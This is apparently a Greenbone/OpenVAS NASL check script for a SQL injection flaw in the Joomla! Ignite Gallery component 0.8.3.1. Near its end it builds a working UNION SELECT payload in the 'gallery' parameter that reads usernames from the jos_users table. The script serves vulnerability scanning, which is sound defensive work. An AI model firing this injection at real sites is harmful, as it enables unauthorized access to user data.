# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903103");
  script_version("2022-02-14T13:47:12+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-02-14 13:47:12 +0000 (Mon, 14 Feb 2022)");
  script_tag(name:"creation_date", value:"2013-01-29 14:06:14 +0530 (Tue, 29 Jan 2013)");

  script_name("Joomla! Ignite Gallery Component SQL Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/81055");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/joomla-ignite-gallery-0831-sql-injection");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/119278/Joomla-Ignite-Gallery-0.8.3.1-SQL-Injection.html");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow the attackers to manipulate SQL
  queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"Joomla! Ignite Gallery Component version 0.8.3.1");

  script_tag(name:"insight", value:"The flaw is due to an input passed via the 'gallery' parameter to 'index.php'
  (when 'option' is set to 'com_ignitegallery') is not properly sanitised before being used in an SQL query.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Joomla! with Ignite Gallery component is prone to multiple sql injection vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!joomlaPort = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:joomlaPort))
  exit(0);

if (dir == "/")
  dir = "";

vt_strings = get_vt_strings();

url = dir +  "/index.php?option=com_ignitegallery&amp;task=view&amp;" +
             "gallery=-1 union select 1,2,concat(" + vt_strings["lowercase_hex"] +
             ",0x3a,username),4,5,6,7,8,9,10 from jos_users--&amp;Itemid=18&" +
             "amp;3ca3a605131cf698f0c10708dbd5d5f5=b908cde49509d2ec9b39f7e46c90" +
             "88e8&amp;3ca3a605131cf698f0c10708dbd5d5f5=b908cde49509d2ec9b39f7e46c9088e8";

if(http_vuln_check(port:joomlaPort, url:url, check_header:TRUE,
                   pattern:">" + vt_strings["lowercase"] + ":", extra_check:"[j|J]oomla")) {
  report = http_report_vuln_url(port: joomlaPort, url: url);
  security_message(port: joomlaPort, data: report);
  exit(0);
}

exit(99);
